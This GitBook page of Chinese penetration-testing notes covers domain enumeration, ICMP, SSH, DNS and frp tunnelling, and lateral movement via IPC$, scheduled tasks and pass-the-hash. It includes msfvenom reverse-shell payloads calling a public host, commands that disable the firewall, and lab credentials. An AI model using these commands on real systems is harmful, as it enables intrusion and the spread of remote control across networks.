
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>横向移动，代理隧道 · GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    
    <link rel="prev" href="privilege.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    前言
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../tips.html">
            
                <a href="../tips.html">
            
                    
                    tips
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../language/python.html">
            
                <a href="../language/python.html">
            
                    
                    python
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" data-path="../interview/python.html">
            
                <a href="../interview/python.html">
            
                    
                    python后端开发面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.2" data-path="../language/python_secure.html">
            
                <a href="../language/python_secure.html">
            
                    
                    python安全
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.2.1" data-path="../interview/python_secure.html">
            
                <a href="../interview/python_secure.html">
            
                    
                    python安全面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.3" data-path="../language/java.html">
            
                <a href="../language/java.html">
            
                    
                    java
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.3.1" data-path="../language/javagui.html">
            
                <a href="../language/javagui.html">
            
                    
                    java swing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.2" data-path="../language/javafx.html">
            
                <a href="../language/javafx.html">
            
                    
                    javafx
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.3" data-path="../interview/java.html">
            
                <a href="../interview/java.html">
            
                    
                    JAVA后端开发面试题
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.4" data-path="../language/s2.html">
            
                <a href="../language/s2.html">
            
                    
                    s2
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.4" data-path="../language/golang.html">
            
                <a href="../language/golang.html">
            
                    
                    golang
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.4.1" data-path="../interview/golang.html">
            
                <a href="../interview/golang.html">
            
                    
                    golang后端开发面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.5" data-path="../thinkphp/thinkphp6.html">
            
                <a href="../thinkphp/thinkphp6.html">
            
                    
                    thinkphp
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.5.1" data-path="../thinkphp/thinkphp面试题.html">
            
                <a href="../thinkphp/thinkphp面试题.html">
            
                    
                    thinkphp框架面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.6" data-path="../thinkphp/yii2.html">
            
                <a href="../thinkphp/yii2.html">
            
                    
                    yii2
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.7" data-path="../c#/c">
            
                <span>
            
                    
                    c#
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.7.1" data-path="../.net/.net面试题.html">
            
                <a href="../.net/.net面试题.html">
            
                    
                    .NET面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.8" data-path="../language/c++.html">
            
                <a href="../language/c++.html">
            
                    
                    c++
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.8.1" data-path="../language/c++面试题.html">
            
                <a href="../language/c++面试题.html">
            
                    
                    c++面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.9" data-path="../android/base.html">
            
                <a href="../android/base.html">
            
                    
                    安卓开发
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="../language/algorithm.html">
            
                <a href="../language/algorithm.html">
            
                    
                    算法基础
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="4.1" data-path="../web/sql injection.html">
            
                <a href="../web/sql injection.html">
            
                    
                    sql注入
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2" data-path="../web/xss.html">
            
                <a href="../web/xss.html">
            
                    
                    XSS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3" data-path="../web/xxe.html">
            
                <a href="../web/xxe.html">
            
                    
                    XXE
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="5.1" data-path="privilege.html">
            
                <a href="privilege.html">
            
                    
                    权限提升
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="5.2" data-path="information.html">
            
                <a href="information.html">
            
                    
                    横向移动，代理隧道
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.3" >
            
                <span>
            
                    
                    [权限维持]
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.3.1" data-path="../thinkphp/pentest.html">
            
                <a href="../thinkphp/pentest.html">
            
                    
                    渗透面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="6.1" data-path="../reverse/pe.html">
            
                <a href="../reverse/pe.html">
            
                    
                    PE文件结构
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.2" data-path="../base/huibian2.html">
            
                <a href="../base/huibian2.html">
            
                    
                    汇编
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3" data-path="../reverse/win32.html">
            
                <a href="../reverse/win32.html">
            
                    
                    win32
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.4" data-path="../reverse/mfc.html">
            
                <a href="../reverse/mfc.html">
            
                    
                    MFC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.5" data-path="../reverse/保护模式.html">
            
                <a href="../reverse/保护模式.html">
            
                    
                    保护模式
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.5.1" >
            
                <span>
            
                    
                    逆向基础面试题
            
                </span>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="7.1" data-path="antikill.html">
            
                <a href="antikill.html">
            
                    
                    免杀
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.2" data-path="antikillinter.html">
            
                <a href="antikillinter.html">
            
                    
                    反病毒/免杀面试题
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >横向移动，代理隧道</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/160641/31/37617/38655/64aa8edaFfdbb65ad/bfe2c8b5d9285896.jpg" alt="image.png"></p>
<h3 id="&#x4EE3;&#x7406;&#x548C;&#x96A7;&#x9053;">&#x4EE3;&#x7406;&#x548C;&#x96A7;&#x9053;</h3>
<p>&#x5224;&#x65AD;&#x662F;&#x5426;&#x5728;&#x57DF;</p>
<pre><code>// &#x5224;&#x65AD;&#x662F;&#x5426;&#x5728;&#x57DF;
net view /domain
net time /domain
ipconfig /all        //&#x4E3B;dns&#x540E;&#x7F00;
//&#x67E5;&#x770B;&#x57DF;&#x7BA1;&#x7406;&#x5458;
net localgroup &quot;domain admins&quot; /domain
//&#x67E5;&#x770B;&#x57DF;&#x63A7;
net group &quot;domain controllers&quot; /domain
//&#x67E5;&#x770B;&#x57DF;&#x63A7;&#x6240;&#x5728;&#x7684;IP
net group &quot;domain controllers&quot; /domain    --&gt;  ping OWA
net time /domain    --&gt;  ping OWA
</code></pre><p>BloodHound</p>
<p>&#x4E0A;&#x4F20; BloodHound-win32-x64\resources\app\Collectors &#x5185;&#x7684;SharpHound.exe&#x5230;&#x670D;&#x52A1;&#x5668;&#x6267;&#x884C;</p>
<pre><code>SharpHound.exe -c all
</code></pre><p>&#x4F1A;&#x5728;&#x672C;&#x5730;&#x751F;&#x6210;&#x538B;&#x7F29;&#x5305;&#xFF0C;&#x653E;&#x5728;&#x672C;&#x5730;&#x7528;BloodHound&#x5DE5;&#x5177;&#x5206;&#x6790;</p>
<p>&#x6253;&#x5F00;neo4j</p>
<pre><code>neo4j.bat console
</code></pre><p>&#x7136;&#x540E;&#x6253;&#x5F00;BloodHound&#xFF0C;&#x8F93;&#x5165;&#x8D26;&#x53F7;&#x5BC6;&#x7801;neo4j&#xFF1A;2019xxxxxx</p>
<pre><code>&#x96A7;&#x9053;&#xFF1A;&#x534F;&#x8BAE;&#x4E0D;&#x51FA;&#x7F51;
&#x4EE3;&#x7406;&#xFF1A;&#x89E3;&#x51B3;&#x7F51;&#x7EDC;&#x901A;&#x8BAF;
</code></pre><p>&#x5982;&#x679C;&#x4E0D;&#x51FA;&#x7F51;&#x600E;&#x4E48;&#x529E;</p>
<pre><code>&#x5047;&#x8BBE;&#x6709;p1(&#x4E0D;&#x51FA;&#x7F51;) &#xFF0C;p2(&#x51FA;&#x7F51;)
1.&#x901A;&#x8FC7;&#x62FF;&#x4E0B;p2&#x4E4B;&#x540E;&#x6B63;&#x5411;&#x63A7;&#x5236;p1
2.&#x901A;&#x8FC7;&#x96A7;&#x9053;&#x6280;&#x672F;&#xFF0C;&#x4F7F;p1&#x901A;&#x8FC7;&#x5176;&#x4ED6;&#x534F;&#x8BAE;&#x51FA;&#x7F51;
</code></pre><h4 id="icmp">icmp</h4>
<p>&#x573A;&#x666F;1&#xFF1A;</p>
<p>msf:<a href="https://github.com/esrrhs/pingtunnel/releases/" target="_blank">https://github.com/esrrhs/pingtunnel/releases/</a></p>
<pre><code class="lang-python">&#x673A;&#x5668;&#x4E00;&#xFF08;&#x5185;&#x7F51;-&#x4E0D;&#x51FA;&#x7F51;&#x4E3B;&#x673A;&#xFF09;&#xFF1A;<span class="hljs-number">192.168</span><span class="hljs-number">.52</span><span class="hljs-number">.143</span>
&#x673A;&#x5668;&#x4E09;&#xFF08;&#x516C;&#x7F51;-msf&#x4E3B;&#x673A;&#xFF09;&#xFF1A;<span class="hljs-number">129.226</span><span class="hljs-number">.92</span><span class="hljs-number">.29</span>



//[&#x673A;&#x5668;&#x4E00;]&#x5BF9;tcp&#x534F;&#x8BAE;&#x8FDB;&#x884C;&#x4E86;&#x9650;&#x5236;&#xFF0C;&#x6211;&#x4EEC;&#x8FD0;&#x884C;msf.exe&#x6728;&#x9A6C;&#x540E;&#x5C06;&#x6D41;&#x91CF;&#x901A;&#x8FC7;icmp&#x7ED9;&#x5230;&#x5185;&#x7F51;&#x7684;[&#x673A;&#x5668;&#x4E8C;]&#xFF0C;[&#x673A;&#x5668;&#x4E8C;]&#x901A;&#x8FC7;&#x547D;&#x4EE4;&#x5C06;icmp&#x53D8;&#x6210;tcp&#x6D41;&#x91CF;&#x7ED9;[&#x673A;&#x5668;&#x4E09;]

&#x673A;&#x5668;&#x4E00;&#xFF1A;


msfvenom -p windows/meterpreter/reverse_tcp lhost=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> lport=<span class="hljs-number">3333</span> -f exe -o xd.exe

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
set lport <span class="hljs-number">4444</span>
exploit

kali&#x5F00;&#x542F;&#x96A7;&#x9053;
./pingtunnel.exe -type server
./pingtunnel -type server
win&#x5F00;&#x542F;&#x96A7;&#x9053; // &#x5C06;&#x672C;&#x5730;&#x7684;icmp&#x534F;&#x8BAE;&#x6570;&#x636E;&#x8F6C;&#x53D1;&#x81F3;msf&#x7684;<span class="hljs-number">4444</span>&#x7AEF;&#x53E3;&#x4E0A;
pingtunnel.exe -type client -l <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3333</span> -s <span class="hljs-number">129.226</span><span class="hljs-number">.92</span><span class="hljs-number">.29</span> -t <span class="hljs-number">129.226</span><span class="hljs-number">.92</span><span class="hljs-number">.29</span>:<span class="hljs-number">4444</span> -tcp <span class="hljs-number">1</span> -noprint <span class="hljs-number">1</span> -nolog <span class="hljs-number">1</span>
</code></pre>
<p>cs</p>
<pre><code>pingtunnel.exe -type client -l 127.0.0.1:5555 -s 129.226.92.29 -t 129.226.92.29:6666 -tcp 1 -noprint 1 -nolog 1
</code></pre><pre><code>
kali-&gt; 
msf&#x9700;&#x8981;&#x6DFB;&#x52A0;&#x8DEF;&#x7531;&#xFF0C;cs&#x4E0D;&#x7528;&#x6DFB;&#x52A0;&#x8DEF;&#x7531;
//msf&#x4E0B;&#x7684;meterpreter&#x4E0B;&#x67E5;&#x770B;&#x662F;&#x5426;&#x6709;&#x8DEF;&#x7531;
msfvenom -p windows/meterpreter/reverse_tcp lhost=129.226.92.29 lport=3333 -f exe -o xd1234.exe
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 3333
run
run autoroute -p
</code></pre><p><a href="https://imgse.com/i/ppvMzNt" target="_blank"><img src="https://s1.ax1x.com/2023/04/13/ppvMzNt.png" alt="ppvMzNt.png"></a></p>
<pre><code>//&#x6DFB;&#x52A0;&#x8DEF;&#x7531;&#xFF0C;&#x6B64;&#x65F6;&#x53EA;&#x662F;msf&#x6709;&#x8DEF;&#x7531;&#xFF0C;&#x4F46;&#x662F;&#x5DE5;&#x5177;&#x6CA1;&#x6709;&#x8DEF;&#x5F84;
run post/multi/manage/autoroute
// &#x7ED9;&#x5DE5;&#x5177;&#x6DFB;&#x52A0;&#x8DEF;&#x7531;&#xFF0C;&#x5EFA;&#x7ACB;&#x8282;&#x70B9;
background
use auxiliary/server/socks_proxy
show options
set SRVPORT 1122
run
</code></pre><p><a href="https://imgse.com/i/ppvlfF1" target="_blank"><img src="https://s1.ax1x.com/2023/04/13/ppvlfF1.png" alt="ppvlfF1.png"></a></p>
<pre><code>//&#x7528;proxifier&#x4EE3;&#x7406;
129.226.92.29 1122
</code></pre><p><a href="https://imgse.com/i/ppvlISK" target="_blank"><img src="https://s1.ax1x.com/2023/04/13/ppvlISK.png" alt="ppvlISK.png"></a></p>
<p>&#x8BBF;&#x95EE;&#x5185;&#x7F51;&#x7684;192.168.52.110&#xFF08;&#x4E0D;&#x51FA;&#x7F51;&#xFF09;</p>
<p><a href="https://imgse.com/i/ppvl7Oe" target="_blank"><img src="https://s1.ax1x.com/2023/04/13/ppvl7Oe.png" alt="ppvl7Oe.png"></a></p>
<p>cs</p>
<pre><code>~~~

[![ppvGXDS.png](https://s1.ax1x.com/2023/04/13/ppvGXDS.png)](https://imgse.com/i/ppvGXDS)









&#x4E0A;&#x7EBF;&#x63A7;&#x5236;

cs
</code></pre><p>//&#x5DF2;&#x7ECF;&#x5EFA;&#x7ACB;&#x96A7;&#x9053;&#x540E;&#xFF0C;&#x5EFA;&#x7ACB;&#x76D1;&#x542C;&#x5668; bind_tcp 50051
//&#x653E;&#x5728;win10&#x4E0A;&#x6267;&#x884C;&#xFF0C;&#x672C;&#x5730;&#x5728;&#x5DF2;&#x51FA;&#x7F51;&#x7684;shell&#x4E3B;&#x673A;&#x662F;192.168.52.143&#xFF0C;&#x5728;&#x4ED6;&#x7684;&#x4EA4;&#x4E92;&#x4E0B;&#x6267;&#x884C;
connect 192.168.52.110 50051</p>
<pre><code>
[![ppvJTZF.png](https://s1.ax1x.com/2023/04/13/ppvJTZF.png)](https://imgse.com/i/ppvJTZF)

&#x540C;&#x7406;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x591A;&#x5C42;&#x4EE3;&#x7406;&#xFF0C;&#x5C31;&#x76F8;&#x5E94;&#x7684;&#x5728;&#x8FD9;&#x4E2A;win10&#x4E0A;&#x518D;&#x5F00;sock5

msf
</code></pre><p>//&#x540C;&#x7406;&#xFF0C;&#x751F;&#x6210;&#x672C;&#x5730;&#x540E;&#x95E8;
msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=3333 -f exe -o xxx.exe</p>
<p>use exploit/multi/handler
set payload windows/meterpreter/bind_tcp
set lhost 192.168.52.110
set lport 3333
exploit</p>
<pre><code>

</code></pre><p>proxychains linux&#x4E0A;&#x7684;</p>
<pre><code>




&#x4F7F;&#x7528;&#x4EE3;&#x7406;&#x8F6C;&#x53D1;&#x4E0A;&#x7EBF;

[![ppxDRat.png](https://s1.ax1x.com/2023/04/13/ppxDRat.png)](https://imgse.com/i/ppxDRat)

&#x8FD9;&#x91CC;&#x5FC5;&#x987B;&#x662F;192.168.52.143&#xFF0C;&#x56E0;&#x4E3A;win10&#x7684;&#x5730;&#x5740;&#x662F;192.168.52.110



[![ppxDHqs.png](https://s1.ax1x.com/2023/04/13/ppxDHqs.png)](https://imgse.com/i/ppxDHqs)
</code></pre><p>&#x96A7;&#x9053;&#x6280;&#x672F;
&#x53CD;&#x5411;&#x8FDE;&#x63A5;
&#x5173;&#x95ED;-&gt;&#x66FF;&#x6362;-&gt;&#x66FF;&#x6362;</p>
<pre><code>
https://www.cnblogs.com/tomtellyou/p/16300557.html
</code></pre><p>&#x67E5;&#x770B;&#x5F53;&#x524D;&#x9632;&#x706B;&#x5899;&#x72B6;&#x6001;&#xFF1A;netsh advfirewall show allprofiles
&#x5173;&#x95ED;&#x9632;&#x706B;&#x5899;&#xFF1A;netsh advfirewall set allprofiles state off
&#x5F00;&#x542F;&#x9632;&#x706B;&#x5899;&#xFF1A;netsh advfirewall set allprofiles state on
&#x6062;&#x590D;&#x521D;&#x59CB;&#x9632;&#x706B;&#x5899;&#x8BBE;&#x7F6E;&#xFF1A;netsh advfirewall reset
&#x542F;&#x7528;&#x684C;&#x9762;&#x9632;&#x706B;&#x5899;: netsh advfirewall set allprofiles state on</p>
<p>&#x4F46;&#x662F;&#x9700;&#x8981;&#x770B;&#x6743;&#x9650;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x57DF;&#x7528;&#x6237;&#xFF0C;&#x9632;&#x706B;&#x5899;&#x662F;&#x57DF;&#x63A7;&#x7BA1;&#x7406;&#x5458;&#x540C;&#x6B65;&#x8BBE;&#x7F6E;&#x7684;&#xFF0C;&#x81EA;&#x5DF1;&#x65E0;&#x6CD5;&#x4FEE;&#x6539;;&#x5982;&#x679C;&#x4E0D;&#x662F;&#x540C;&#x6B65;&#x5219;&#x53EF;&#x4EE5;
&#x5982;&#x679C;&#x662F;&#x5DE5;&#x4F5C;&#x7EC4;&#x7528;&#x6237;&#xFF0C;&#x53EA;&#x8981;&#x5F53;&#x524D;&#x7528;&#x6237;&#x5177;&#x5907;&#x6743;&#x9650;&#x5C31;&#x53EF;&#x4EE5;&#x5173;&#x95ED;&#xFF08;&#x53EF;&#x4EE5;&#x63D0;&#x6743;&#x5B8C;&#x518D;&#x8BD5;&#xFF09;</p>
<pre><code>


&#x96A7;&#x9053;

DNS&#xFF0C;SMB&#xFF0C;ICMP&#xFF0C;SSH
</code></pre><p>icmp&#x901A;&#x8FC7;ping&#x5224;&#x65AD;
smb&#x662F;445&#x5F00;&#x653E;
dns&#x662F; nslookup dig
ssh&#x662F;22</p>
<pre><code>


#### SMB

&#x521B;&#x5EFA;&#x76D1;&#x542C;&#x5668;

[![ppz3IZF.png](https://s1.ax1x.com/2023/04/14/ppz3IZF.png)](https://imgse.com/i/ppz3IZF)

[![ppz3TIJ.png](https://s1.ax1x.com/2023/04/14/ppz3TIJ.png)](https://imgse.com/i/ppz3TIJ)

#### DNS
</code></pre><p>&#x533A;&#x57DF;&#x4F20;&#x8F93;tcp
&#x57DF;&#x540D;&#x89E3;&#x6790;udp</p>
<pre><code>
&#x6DFB;&#x52A0;&#x4E09;&#x6761;&#x8BB0;&#x5F55;

[![ppzGe6x.png](https://s1.ax1x.com/2023/04/14/ppzGe6x.png)](https://imgse.com/i/ppzGe6x)

[![ppzGM7D.png](https://s1.ax1x.com/2023/04/14/ppzGM7D.png)](https://imgse.com/i/ppzGM7D)[![ppzGlAe.png](https://s1.ax1x.com/2023/04/14/ppzGlAe.png)](https://imgse.com/i/ppzGlAe)

[![ppzG4N4.png](https://s1.ax1x.com/2023/04/14/ppzG4N4.png)](https://imgse.com/i/ppzG4N4)

&#x3002;

&#x4E0A;&#x7EBF;&#x540E;&#x6267;&#x884C;
</code></pre><p>mode dns-txt</p>
<pre><code>
#### ssh

&#x65E0;&#x6CD5;&#x901A;&#x8FC7;cs&#x4E0A;&#x7EBF;

linux&#x4E0A;&#x5F00;&#x542F;ssh&#x767B;&#x9646;
</code></pre><p>vi /etc/ssh/sshd_config
PermitRootLogin yes
PasswordAuthentication yes</p>
<p>/etc/init.d/ssh start
/etc/init.d/ssh restart</p>
<p>&#x672C;&#x5730;&#xFF1A;&#x51FA;&#x7AD9;&#x88AB;&#x5C01;&#xFF0C;&#x5219;&#x8BA9;linux&#x8F6C;&#x53D1;&#x7ED9;&#x672C;&#x5730;&#xFF0C;&#x6211;&#x4EEC;&#x4E3B;&#x52A8;&#x53BB;&#x8FDE;&#x63A5;
ssh -CfNg -L 1122:192.168.1.15:8080 root@192.168.1.166</p>
<h2 id="curl-http1270011122">curl <a href="http://127.0.0.1:1122" target="_blank">http://127.0.0.1:1122</a></h2>
<p>&#x8FDC;&#x7A0B;&#xFF1A;&#x5165;&#x7AD9;&#x88AB;&#x5C01;&#xFF0C;&#x5219;&#x8BA9;linux&#x5C06;&#x5185;&#x7F51;&#x7684;&#x5730;&#x5740;&#x8F6C;&#x53D1;&#x7ED9;&#x5916;&#x7F51;&#x7684;&#x67D0;&#x67D0;&#x7AEF;&#x53E3;</p>
<p>ssh -CfNg -R 1234:192.168.1.15:8080 root@129.226.92.29
curl <a href="http://127.0.0.1:1234" target="_blank">http://127.0.0.1:1234</a></p>
<pre><code>
https://gloxec.github.io/CrossC2/zh_cn/

&#x9488;&#x5BF9;linux&#x7684;cs&#x4E0A;&#x7EBF;

&#x56E0;&#x4E3A;&#x6B63;&#x5411;&#x53EA;&#x652F;&#x6301;tcp&#xFF0C;&#x53CD;&#x5411;&#x53EA;&#x652F;&#x6301;https&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;https&#x76D1;&#x542C;&#x5668;

[![ppzdiKs.png](https://s1.ax1x.com/2023/04/14/ppzdiKs.png)](https://imgse.com/i/ppzdiKs)

&#x521B;&#x5EFA;&#x53CD;&#x5411;https

[![ppzdNGD.png](https://s1.ax1x.com/2023/04/14/ppzdNGD.png)](https://imgse.com/i/ppzdNGD)[![ppzdaxH.png](https://s1.ax1x.com/2023/04/14/ppzdaxH.png)](https://imgse.com/i/ppzdaxH)
</code></pre><p>/home/ubuntu/genCrossC2.Linux 129.226.92.29 5555 ./.cobaltstrike.beacon_keys null Linux x64 t_cc2.out</p>
<pre><code>
&#x5728;&#x670D;&#x52A1;&#x7AEF;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;

[![ppzwmwt.png](https://s1.ax1x.com/2023/04/14/ppzwmwt.png)](https://imgse.com/i/ppzwmwt)

&#x751F;&#x6210;&#x4E86;t_cc2.out&#xFF0C;&#x653E;&#x5728;kali&#x4E0A;&#x6267;&#x884C;
</code></pre><p>./t_cc2.out</p>
<pre><code>

</code></pre><p>./genCrossC2.Linux 129.226.92.29 5555 null null Linux x64 test</p>
<pre><code>




#### &#x5185;&#x7F51;&#x7A7F;&#x900F;
</code></pre><p>ngrok&#xFF0C;frp&#xFF0C;spp&#xFF0C;ew&#xFF0C;nps</p>
<pre><code>

</code></pre><p>&#x5185;&#x7F51;msf        192.168.1.101
&#x5185;&#x7F51;&#x88AB;&#x63A7;&#x673A; * 1        192.168.0.121 
&#x516C;&#x7F51;ngrok :   tcp://batmanfuture.free.com 12345        &#x8BBE;&#x7F6E;&#x8F6C;&#x53D1;&#x5185;&#x90E8;127.0.0.1&#x548C;cs&#x76D1;&#x542C;&#x7AEF;&#x53E3;5555</p>
<p>&#x5185;&#x7F51;msf&#x751F;&#x6210;payload&#xFF1A; batmanfuture.free.com 12345   shell.exe,&#x8FD0;&#x884C;sunny.exe</p>
<pre><code>
##### Frp

https://github.com/fatedier/frp/releases

&#x5B89;&#x88C5;ftp&#xFF1A;https://blog.csdn.net/qq_43557686/article/details/126028541
</code></pre><p>//&#x67E5;&#x770B;&#x670D;&#x52A1;&#x5668;linux&#x7684;&#x67B6;&#x6784;
arch
x86_64 -&gt; X86&#x67B6;&#x6784;
<a href="https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz" target="_blank">https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz</a>
aarch64 -&gt; ARM&#x67B6;&#x6784;
<a href="https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_arm64.tar.gz" target="_blank">https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_arm64.tar.gz</a>
&#x670D;&#x52A1;&#x7AEF;
./frps -c ./frps.ini
&#x5BA2;&#x6237;&#x7AEF;
frpc.exe -c frpc.ini</p>
<pre><code>




### &#x6A2A;&#x5411;&#x79FB;&#x52A8;

#### IPC$

##### at&#x548C;schtasks

~~~shell
1. at &lt; windows2012
net use \\192.168.52.138\ipc$ &quot;A@2019gaokaowar&quot; /user:god.org\administrator #&#x5EFA;&#x7ACB;ipc&#x8FDE;&#x63A5;
copy 4444.exe \\192.168.52.138\c$  #&#x62F7;&#x8D1D;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x5230;&#x76EE;&#x5F55;
at \\192.168.52.138 19:45 c:\4444.exe  # &#x6DFB;&#x52A0;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;
connect 192.168.52.138 4444

1. schtasks &gt; windows2012
net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user/god.org\administrator #&#x5EFA;&#x7ACB;ipc&#x8FDE;&#x63A5;
copy beacon.exe \\192.168.3.21 c:\beancon.exe #&#x62F7;&#x8D1D;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x5230;&#x76EE;&#x5F55;

schtasks /create /s 192.168.52.138 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\4444.exe /F #&#x521B;beacon&#x4EFB;&#x52A1;&#x5BF9;&#x5E94;&#x6267;&#x884C;&#x6587;&#x4EF6;
schtasks /run /s 192.168.52.138 /tn adduser /i #&#x8FD0;&#x884C;adduser&#x4EFB;&#x52A1;
schtasks /delete /s 192.168.52.138 /tn adduser /f#&#x5220;&#x9664;adduser&#x4EFB;&#x52A1;

connect 192.168.3.32 #&#x8FDE;&#x63A5;192.168.3.32
</code></pre><h5 id="impacket--sock5&#x96A7;&#x9053;">impacket + sock5&#x96A7;&#x9053;</h5>
<pre><code class="lang-shell">&#x4E0A;&#x4F20;atexec.exe&#x6267;&#x884C;
atexec.exe god/administrator:A@2019gaokaowar@192.168.52.138 &quot;whoami&quot;

atexec.exe -hashes :xxxxxxxxxxxxxx god/administrator@192.168.52.138 &quot;whoami&quot;
</code></pre>
<p>&#x6216;&#x8005;&#x76F4;&#x63A5;&#x81EA;&#x5DF1;&#x5F00;sock5&#x96A7;&#x9053;&#xFF0C;&#x7136;&#x540E;&#x76F4;&#x63A5;&#x7528;&#x81EA;&#x5DF1;&#x7684;xxx.py&#x5957;&#x4EF6;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> os,time
ips={
    <span class="hljs-string">&apos;192.168.3.21&apos;</span>,
    <span class="hljs-string">&apos;192.168.3.25&apos;</span>,
    <span class="hljs-string">&apos;192.168.3.29&apos;</span>,
    <span class="hljs-string">&apos;192.168.3.30&apos;</span>,
    <span class="hljs-string">&apos;192.168.3.32&apos;</span>
}

users={
    <span class="hljs-string">&apos;Administrator&apos;</span>,
}
passs={
